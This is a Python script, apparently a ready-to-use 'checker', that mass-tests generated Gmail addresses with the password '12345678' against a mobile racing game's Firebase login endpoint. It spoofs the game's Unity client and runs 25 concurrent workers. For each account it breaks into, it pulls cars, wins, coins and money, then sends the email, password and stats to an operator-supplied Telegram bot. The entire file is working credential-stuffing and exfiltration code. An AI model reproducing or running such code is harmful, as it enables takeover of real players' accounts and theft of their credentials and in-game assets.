import aiohttp
import asyncio
import json
import time
import sys
import os
from faker import Faker

faker = Faker()

hit, good, bad, retry = 0, 0, 0, 0
start_time = time.time()
iidd = input('chat id : ')
tok = input('token :  ')
os.system('cls' if os.name == 'nt' else 'clear')

def update_stats():
    global good, bad
    print(f"             < ¦ True : {good} ~ Bad: {bad} ¦ >   ", end='\r')
    sys.stdout.flush()

async def send_to_telegram(session, email, password, car_count, win_count, drift_max, coin, money):
    global hit
    hit += 1
    current_hit = hit
    
    
    mesaj = f'''HIT CARPARKING #{current_hit}
--------------------
Email: {email}
Sifre: {password}
Araba: {car_count}
Win: {win_count}
Drift: {drift_max}
----------------
Dev @AtlasPy'''
    
    
    print(f"\n{mesaj}")
    
    
    try:
        await session.post(
            f"https://api.telegram.org/bot{tok}/sendMessage",
            params={'chat_id': iidd, 'text': mesaj, 'parse_mode': 'HTML'},
            timeout=aiohttp.ClientTimeout(total=5)
        )
    except:
        pass

async def car_parking2_login(session, email, password):
    global good, bad, retry
    
    try:
        ua = faker.user_agent()
        headers = {
            "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
            "Accept-Encoding": "deflate, gzip",
            "Content-Type": "application/octet-stream",
            "X-Unity-Version": "2022.3.62f2"
        }
        
        payload = {
            "email": email,
            "password": password,
            "returnSecureToken": True,
            "clientType": "CLIENT_TYPE_ANDROID"
        }
        url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
        
        async with session.post(url, json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
            if response.status == 200:
                res_json = await response.json()
                id_token = res_json.get('idToken')
                local_id = res_json.get('localId')
                
                if id_token and local_id:
                    stats_url = "https://europe-west1-cpm-2-7cea1.cloudfunctions.net/GetUserRatingCall22_1"
                    stats_headers = {
                        "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
                        "Accept-Encoding": "gzip",
                        "Content-Type": "application/json; charset=utf-8",
                        "Authorization": f"Bearer {id_token}",
                        "X-Unity-Version": "2022.3.62f2"
                    }
                    stats_payload = {"data": local_id}
                    
                    async with session.post(stats_url, json=stats_payload, headers=stats_headers, timeout=aiohttp.ClientTimeout(total=10)) as stats_response:
                        car_count = 0
                        win_count = 0
                        drift_max = 0
                        coin = 0
                        money = 0
                        
                        if stats_response.status == 200:
                            try:
                                stats_json = await stats_response.json()
                                if 'result' in stats_json:
                                    data = json.loads(stats_json['result'])
                                    general = data.get('general', {})
                                    
                                    car_count = general.get('cars', 0)
                                    if car_count == 'N/A' or car_count is None:
                                        car_count = 0
                                        
                                    win_count = general.get('race_win', 0)
                                    if win_count == 'N/A' or win_count is None:
                                        win_count = 0
                                        
                                    drift_max = general.get('drift_max', 0)
                                    if drift_max == 'N/A' or drift_max is None:
                                        drift_max = 0
                                    
                                    coin = general.get('coin', 0)
                                    if coin == 'N/A' or coin is None:
                                        coin = general.get('coins', 0)
                                    if coin == 'N/A' or coin is None:
                                        coin = general.get('gold', 0)
                                    if coin == 'N/A' or coin is None:
                                        coin = 0
                                    
                                    money = general.get('money', 0)
                                    if money == 'N/A' or money is None:
                                        money = general.get('cash', 0)
                                    if money == 'N/A' or money is None:
                                        money = general.get('dollar', 0)
                                    if money == 'N/A' or money is None:
                                        money = 0
                                    
                                    if coin == 0 or money == 0:
                                        if 'coin' in data and data['coin'] != 'N/A':
                                            coin = data.get('coin', 0)
                                        if 'money' in data and data['money'] != 'N/A':
                                            money = data.get('money', 0)
                                        
                                        if 'user' in data:
                                            user_data = data.get('user', {})
                                            if coin == 0:
                                                coin = user_data.get('coin', user_data.get('coins', 0))
                                            if money == 0:
                                                money = user_data.get('money', user_data.get('cash', 0))
                            except:
                                pass
                        
                        good += 1
                        await send_to_telegram(session, email, password, car_count, win_count, drift_max, coin, money)
                        update_stats()
                        return
                else:
                    bad += 1
                    update_stats()
            else:
                try:
                    error_json = await response.json()
                    error_msg = error_json.get('error', {}).get('message', '')
                    if error_msg == 'EMAIL_NOT_FOUND' or error_msg == 'INVALID_PASSWORD':
                        bad += 1
                    else:
                        bad += 1
                    update_stats()
                except:
                    bad += 1
                    update_stats()
                    
    except Exception as e:
        retry += 1
        update_stats()

async def worker(semaphore, session):
    async with semaphore:
        while True:
            email = faker.user_name() + "@gmail.com"
            for password in ['12345678']:
                await car_parking2_login(session, email, password)

async def main():
    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        semaphore = asyncio.Semaphore(25)
        tasks = [asyncio.create_task(worker(semaphore, session)) for _ in range(25)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())